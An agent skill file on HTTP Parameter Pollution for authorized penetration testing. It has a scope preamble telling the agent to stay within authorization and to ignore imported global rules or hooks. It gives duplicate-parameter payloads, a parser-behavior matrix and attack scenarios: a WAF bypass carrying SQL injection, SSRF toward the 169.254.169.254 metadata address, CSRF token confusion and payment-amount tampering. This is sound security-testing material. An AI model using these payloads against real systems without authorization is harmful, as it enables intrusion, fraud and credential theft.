---
name: http-parameter-pollution
description: >-
  HTTP Parameter Pollution (HPP): duplicate query/body keys parsed differently by servers, proxies, WAFs, and app frameworks. Use when filters and application layers disagree on which value wins, enabling bypass, SSRF second URL, logic abuse, or CSRF token confusion.
license: "MIT-with-third-party-provenance-review"
compatibility: "Requires the canonical reverse-skill case/scope contract; source tools are optional."
allowed-tools: Read Write Edit Glob Grep Bash
metadata:
  integrated: "true"
  integration-source: "hack-skills"
  source-path: "skills/http-parameter-pollution/SKILL.md"
  maturity: "partial"
  integration-risk: "high"
  allowed-context: "authorized-lab,defensive"
  user-invocable: "false"
---


## Integrated reverse-skill contract

This capability is loaded through the canonical reverse-skill router. The source
material is preserved for attribution, but execution follows the host package contract:

1. **Scope first**: initialize the current `work/<case>/scope.md` with the canonical
   `case-init` flow. A target action requires an authorized scope or an explicit
   offline/lab sample; a source document is not authorization.
2. **Tools by registry**: read the package `skills/tool-index.md` before using a tool.
   Missing tools become a disclosed installation plan; imported scripts never install
   or download dependencies implicitly.
3. **One case root**: write notes, artifacts, hashes, and reports under the current
   case. Do not create a parallel source-package `case`, `output`, or `workspace`
   tree.
4. **Evidence labels**: distinguish `observed`, `inferred`, `unverified`, and
   `blocked`. Record the artifact path/hash and a reproducible command for each
   material claim.
5. **Handoff**: finish with the selected downstream skill, artifacts, verification
   result, limitations, and the next safe action. High-risk device, network, exploit,
   install, or patch operations remain explicit user-authorized actions.

The imported text may describe a different host or directory layout. Resolve paths
relative to this file or the canonical package root and ignore any source-level global
rules, hooks, MCP registration, or automatic bootstrap instructions.

# SKILL: HTTP Parameter Pollution (HPP)

> **Vendor source summary (reference-only; not a load instruction)**: Model the **full request path**: browser → CDN/WAF → reverse proxy → app framework → business code. Duplicate keys (`a=1&a=2`) are not an error at HTTP level; each hop may pick first, last, join, or array-ify. Test HPP when WAF and app disagree, or when internal HTTP clients rebuild query strings. Routing note: when the same parameter appears multiple times, or WAF/backend stacks differ, use the Section 1 matrix to test first/last/merge assumptions, then design Section 3 scenario chains.

## 0. QUICK START

**Hypothesis**: the **security check** reads one occurrence of a parameter while the **action** reads another.

### First-pass payloads

```text
id=1&id=2
id=1&id=1%20OR%201=1
url=https://legit.example&id=https://evil.example
amount=1&amount=9999
csrf=TOKEN_A&csrf=TOKEN_B
user=alice&user=admin
```

### Body variants (repeat for POST)

```text
application/x-www-form-urlencoded
id=1&id=2

multipart/form-data
------boundary
Content-Disposition: form-data; name="id"
1
------boundary
Content-Disposition: form-data; name="id"
2
```

### Quick methodology

1. Fingerprint **front** stack (CDN/WAF) vs **origin** (language/framework) using baseline `a=1&a=2`.
2. Send **both** orders: `a=1&a=2` and `a=2&a=1` (some parsers are order-sensitive).
3. If JSON: test **duplicate keys** and Content-Type confusion (see Section 2).

---

## 1. SERVER BEHAVIOR MATRIX

Typical defaults — **always confirm**; middleware and custom parsers override these.

| Technology | Behavior | Example: `a=1&a=2` |
|---|---|---|
| PHP / Apache (`$_GET`) | Last occurrence | `a=2` |
| ASP.NET / IIS | Often comma-joined (all) | `a=1,2` |
| JSP / Tomcat (servlet param) | First occurrence | `a=1` |
| Python / Django (`QueryDict`) | Last occurrence | `a=2` |
| Python / Flask (`request.args`) | First occurrence | `a=1` |
| Node.js / Express (`req.query`) | Array of values | `a=['1','2']` (shape may vary by parser version) |
| Perl / CGI | First occurrence | `a=1` |
| Ruby / Rack (Rack::Utils) | Last occurrence | `a=2` |
| Go `net/http` (`ParseQuery`) | First occurrence | `a=1` |

**Why it matters**: a WAF on **IIS** might see `1,2` while PHP backend receives `2` only — or the reverse if a proxy normalizes.

---

## 2. PAYLOAD PATTERNS

### 2.1 Basic duplicate key

```http
GET /api?q=safe&q=evil HTTP/1.1
```

### 2.2 Array-style (PHP / some frameworks)

```http
GET /api?id[]=1&id[]=2 HTTP/1.1
```

### 2.3 Mixed array + scalar

```http
GET /api?item[]=a&item=b HTTP/1.1
```

### 2.4 Encoded ampersand (parser differential)

```text
# Literal & inside a value vs new pair — depends on decoder
param=value1%26other=value2
param=value1&other=value2
```

### 2.5 Nested / bracket keys

```http
GET /api?user[name]=a&user[role]=user&user[role]=admin HTTP/1.1
```

### 2.6 JSON duplicate keys

```json
{"test":"user","test":"admin"}
```

Many parsers keep **last** key; some keep **first**. JavaScript `JSON.parse` keeps the last duplicate key.

---

## 3. ATTACK SCENARIOS

### 3.1 HPP + WAF bypass

**Pattern**: WAF inspects **first** value; application uses **last**.

```text
id=1&id=1%20UNION%20SELECT%20...
```

Also try: benign value in JSON field duplicated in query string, if gateway merges sources differently.

### 3.2 HPP + SSRF

**Pattern**: validator reads **safe** URL; fetcher reads **internal/evil** URL.

```text
url=https://allowed.cdn.example/&url=http://169.254.169.254/
```

Confirm which component (library vs app) consumes which occurrence.

### 3.3 HPP + CSRF

**Pattern**: duplicate anti-CSRF token so one copy satisfies parser A and another satisfies parser B.

```text
csrf=LEGIT&csrf=IGNORED_OR_ALT
```

Use only in **authorized** CSRF assessments with a clear state-changing target.

### 3.4 HPP + business logic (e.g. payment)

```text
amount=1&amount=5000
quantity=1&quantity=-1
price=9.99&price=0.01
```

Pair with **race conditions** or **server-side rounding** for higher impact; HPP alone often needs a split interpretation across layers.

---

## 4. TOOLS

| Tool | How to use |
|---|---|
| **Burp Suite** | Repeater: duplicate keys in raw query/body; Param Miner / extensions for hidden params; compare responses for `first` vs `last` interpretation |
| **OWASP ZAP** | Manual Request Editor; Automated Scan may not deeply fuzz HPP — prefer manual variants |
| **Custom scripts** | Build exact raw HTTP (preserve ordering) — some clients normalize duplicates |

**Tip**: log **raw** query strings at the app if you control a test lab; some frameworks expose only the “winning” value while logs show the full string.

---

## 5. DECISION TREE

```text
                    +-------------------------+
                    | Duplicate param name    |
                    | same request            |
                    +------------+------------+
                                 |
              +------------------+------------------+
              |                                     |
       +------v------+                       +------v------+
       | Single app  |                       | WAF / CDN / |
       | layer only  |                       | proxy chain |
       +------+------+                       +------+------+
              |                                     |
    +---------v---------+                 +---------v---------+
    | Read framework    |                 | Map each hop:     |
    | docs + test       |                 | first/last/join/  |
    | a=1&a=2 vs swap   |                 | array             |
    +---------+---------+                 +---------+---------+
              |                                     |
              +------------------+------------------+
                                 |
                          +------v------+
                          | Pick attack |
                          | template    |
                          +------+------+
                                 |
         +-----------+-----------+-----------+-----------+
         |           |           |           |           |
    +----v----+ +----v----+ +----v----+ +----v----+ +----v----+
    | WAF vs  | | SSRF    | | CSRF    | | Logic   | | JSON    |
    | app     | | split   | | token   | | numeric | | dup key |
    | value   | | URL     | | confuse | | fields  | | parsers |
    +---------+ +---------+ +---------+ +---------+ +---------+
```

---

**Safety & scope**: HPP testing can change server state (payments, account settings). Run only where **explicitly authorized**, with scoped accounts, and document parser behavior before high-impact requests.
